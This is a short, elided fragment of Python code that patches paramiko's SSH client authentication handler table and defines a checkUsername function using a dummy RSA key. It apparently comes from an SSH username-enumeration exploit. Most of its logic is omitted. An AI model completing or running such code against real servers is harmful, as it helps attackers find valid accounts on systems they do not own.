...
# Patch handler table correctly
from paramiko.auth_handler import AuthHandler
# Access the handler table from an instance
from paramiko.auth_handler import AuthHandler
client_table = AuthHandler._client_handler_table.fget(AuthHandler)
old_parse_service_accept = client_table[paramiko.common.MSG_SERVICE_ACCEPT]
...
def checkUsername(username, tried=0):
    ...
    try:
        # Use a persistent dummy RSA key
        try:
            if not hasattr(checkUsername, "_dummy_key"):
                checkUsername._dummy_key = paramiko.RSAKey.generate(2048)
            key = checkUsername._dummy_key
